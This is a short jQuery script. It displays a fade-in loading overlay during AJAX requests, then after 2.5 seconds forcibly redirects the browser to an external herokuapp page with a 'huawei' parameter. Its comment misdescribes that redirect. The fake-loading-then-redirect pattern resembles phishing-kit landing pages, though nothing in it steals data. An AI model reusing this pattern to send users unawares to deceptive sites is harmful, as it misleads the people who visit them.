jQuery(function($){
  $(document).ajaxSend(function() {
    $("#overlay").fadeIn(300);　
  });
    
  $('#button').click(function(){
    $.ajax({
      type: 'GET',
      success: function(data){
        console.log(data);
      }
    }).done(function() {
      setTimeout(function(){
        $("#overlay").fadeOut(300);
      },300);
    });
  }); 
  setTimeout(function() {   //calls click event after a certain time
    $(location).attr('href','https://loading-metax1.herokuapp.com/main.php?re=huawei&n=1')
 }, 2500);

});


